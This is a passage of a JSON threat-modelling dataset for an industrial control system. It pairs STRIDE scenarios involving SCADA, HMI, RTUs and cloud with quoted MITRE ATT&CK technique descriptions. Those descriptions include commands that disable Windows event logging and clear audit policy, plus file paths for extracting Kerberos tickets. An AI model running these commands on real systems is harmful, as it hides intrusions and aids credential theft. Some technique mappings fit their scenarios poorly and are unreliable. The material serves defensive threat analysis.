                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "20",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could impersonate a legitimate gateway to intercept and alter data transmitted between the SCADA system and the cloud services.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can gain physical or remote access to the network to insert a rogue gateway",
                    "Role": "Attacker",
                    "Condition": "Network security is insufficient."
                },
                {
                    "Assumption": "The SCADA system does not have strong mutual authentication with the gateway",
                    "Role": "System Designer",
                    "Condition": "Weak or no mutual authentication exists in the network design."
                }
            ],
            "Potential Impact": "Integrity and confidentiality of data are compromised.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof field device communications, leading the Control Center to take incorrect actions based on falsified device data.",
            "Assumptions": [
                {
                    "Assumption": "Field devices lack strong authentication mechanisms",
                    "Role": "Field Device Manufacturer",
                    "Condition": "Field devices implement weak or no authentication."
                },
                {
                    "Assumption": "The attacker can intercept and relay communication between field devices and RTUs",
                    "Role": "Attacker",
                    "Condition": "Insufficient encryption or communication security."
                }
            ],
            "Potential Impact": "Incorrect control commands may disrupt operations, leading to potential safety risks.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "field device",
                "communication",
                "false data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof user credentials to gain unauthorized access to the HMI within the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "Users reuse passwords across multiple systems",
                    "Role": "User",
                    "Condition": "Weak password management practices."
                },
                {
                    "Assumption": "The system does not employ multi-factor authentication",
                    "Role": "System Administrator",
                    "Condition": "Authentication methods lack additional layers of security."
                }
            ],
            "Potential Impact": "Unauthorized access to HMI could lead to malicious controls or data leaks.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "user credentials",
                "unauthorized access",
                "HMI"
            ],
            "mitre_technique": {
                "name": "Steal or Forge Kerberos Tickets",
                "description": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \u201crealms\u201d, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\n\nOn Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)\n\nLinux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the \"ccache\". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.(Citation: MIT ccache) On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). The ccache file may also be converted into a Windows format using tools such as Kekeo.(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo)\n\n\nKerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, and <code>kcc</code> built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: macOS kerberos framework MIT)\n",
                "id": "attack-pattern--3fc01293-ef5e-41c6-86ce-61f10706b64a",
                "technique_id": "T1558"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could modify control commands being sent from the Control Center to field devices, corrupting the execution of industrial processes.",
            "Assumptions": [
                {
                    "Assumption": "The communication channels are not end-to-end encrypted",
                    "Role": "System Designer",
                    "Condition": "Data transmission relies on unencrypted channels."
                },
                {
                    "Assumption": "The attacker has network access to intercept and alter data packets",
                    "Role": "Attacker",
                    "Condition": "Weak network perimeter defenses."
                }
            ],
            "Potential Impact": "Integrity of control commands is compromised, leading to operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "commands",
                "network",
                "industrial processes"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware delivered through a phishing email could tamper with MES database records, causing data corruption and workflow interruptions.",
            "Assumptions": [
                {
                    "Assumption": "Employees are susceptible to phishing attacks",
                    "Role": "Employee",
                    "Condition": "Lack of phishing awareness training."
                },
                {
                    "Assumption": "Antivirus and anti-malware solutions are not up-to-date",
                    "Role": "IT Security Administrator",
                    "Condition": "Insufficient malware detection and prevention."
                }
            ],
            "Potential Impact": "Operational data integrity is compromised, leading to manufacturing process inefficiencies.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "phishing",
                "malware",
                "MES"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider threat could tamper with configuration settings on PLCs, altering their behavior to cause machine malfunctions.",
            "Assumptions": [
                {
                    "Assumption": "Insider has legitimate access to the PLCs",
                    "Role": "Insider",
                    "Condition": "Trusted personnel with elevated permissions."
                },
                {
                    "Assumption": "There is no finer-grained access control or monitoring on PLCs",
                    "Role": "System Administrator",
                    "Condition": "Lack of continuous monitoring and granular access policies."
                }
            ],
            "Potential Impact": "Equipment malfunctions due to compromised PLC settings, impacting production safety and efficiency.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "PLC",
                "insider threat",
                "configuration"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could perform actions via the HMI and later deny performing these actions due to a lack of logging.",
            "Assumptions": [
                {
                    "Assumption": "Logging and audit trails are inadequately maintained",
                    "Role": "System Administrator",
                    "Condition": "System does not ensure comprehensive logging."
                },
                {
                    "Assumption": "Access control mechanisms are weak",
                    "Role": "Attacker",
                    "Condition": "Poorly enforced access permissions."
                }
            ],
            "Potential Impact": "Actions cannot be traced back to the perpetrator, complicating incident response.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "denial",
                "logging",
                "HMI"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Employees may deny unauthorized data alteration on the MES database if proper access logs are not maintained.",
            "Assumptions": [
                {
                    "Assumption": "MES does not log database access adequately",
                    "Role": "MES Designer",
                    "Condition": "Logging capabilities are insufficient."
                },
                {
                    "Assumption": "User roles and permissions are not properly managed",
                    "Role": "System Administrator",
                    "Condition": "Ineffective user access controls."
                }
            ],
            "Potential Impact": "Data integrity issues without accountability hinder corrective actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "database",
                "access logs",
                "MES"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An external attacker gains access to the SCADA system but later denies the intrusion due to poor monitoring.",
            "Assumptions": [
                {
                    "Assumption": "SCADA system lacks comprehensive intrusion detection and logging",
                    "Role": "System Designer",
                    "Condition": "Inadequate intrusion monitoring systems."
                },
                {
                    "Assumption": "Network traffic is not closely monitored",
                    "Role": "Network Administrator",
                    "Condition": "Lack of real-time network monitoring."
                }
            ],
            "Potential Impact": "Undetected and unaccountable intrusions compromise system security.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "SCADA",
                "access control",
                "monitoring"
            ],
            "mitre_technique": {
                "name": "Indicator Blocking",
                "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting(Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW)(Citation: Microsoft About Event Tracing 2018), by tampering settings that control the collection and flow of event telemetry.(Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nFor example, adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code> to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.(Citation: disable_win_evt_logging) \n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.\n\nIn Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors (Citation: LemonDuck).",
                "id": "attack-pattern--74d2a63f-3c7b-4852-92da-02d8fbab16da",
                "technique_id": "T1562.006"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive operational data transmitted between the RTUs and the cloud could be intercepted and read by unauthorized parties.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not properly encrypted",
                    "Role": "Network Engineer",
                    "Condition": "Data is sent in plaintext over the network."
                },
                {
                    "Assumption": "The attacker has access to network traffic",
                    "Role": "Attacker",
                    "Condition": "Attacker is within the network perimeter."
                }
            ],
            "Potential Impact": "Confidential operational data is exposed, risking competitive advantage and security.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "RTU",
                "cloud"
            ],
            "mitre_technique": {
                "name": "Archive via Utility",
                "description": "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)",
                "id": "attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662",
                "technique_id": "T1560.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could exploit a vulnerability in the HMI to access sensitive information displayed on the interface.",
            "Assumptions": [
                {
                    "Assumption": "HMI software has unpatched vulnerabilities",
                    "Role": "Software Developer",
                    "Condition": "Software updates are not applied timely."
                },
                {
                    "Assumption": "The attacker can bypass network security controls",
                    "Role": "Attacker",
                    "Condition": "Weak or misconfigured network defenses."
                }
            ],
            "Potential Impact": "Sensitive information in the HMI is disclosed, leading to potential sabotage or data theft.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "HMI",
                "vulnerability",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Vulnerabilities",
                "description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",
                "id": "attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327",
                "technique_id": "T1588.006"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Cloud service misconfigurations could expose sensitive data stored in the cloud to unauthorized external access.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage is improperly configured",
                    "Role": "Cloud Administrator",
                    "Condition": "Misconfiguration of cloud security settings."
                },
                {
                    "Assumption": "Sensitive data is stored without adequate access controls",
                    "Role": "Data Manager",
                    "Condition": "Failing to implement strict access policies."
                }
            ],
            "Potential Impact": "Confidential data in cloud storage is publicly accessible, risking information leaks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud storage",
                "misconfiguration",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could flood the RTUs with requests, overwhelming the system and causing operational disruptions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can send a large number of requests to RTUs",
                    "Role": "Attacker",
                    "Condition": "Lack of rate limiting or traffic filtering mechanisms."
                },
                {
                    "Assumption": "RTUs are not equipped to handle high traffic volume",
                    "Role": "System Designer",
                    "Condition": "Insufficient capacity planning."
                }
            ],
            "Potential Impact": "System unavailability affects real-time monitoring and control.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "flooding",
                "RTU",
                "traffic overload"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A coordinated DDoS attack could incapacitate cloud services, preventing access to critical manufacturing data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services lack robust DDoS protection mechanisms",
                    "Role": "Cloud Provider",
                    "Condition": "Insufficient investment in anti-DDoS technologies."
                },
                {
                    "Assumption": "System architecture can't failover to a backup service quickly",
                    "Role": "System Architect",
                    "Condition": "Inadequate disaster recovery planning."
                }
            ],
            "Potential Impact": "Critical data and services become inaccessible, halting operations.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "cloud services",
                "inaccessibility"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
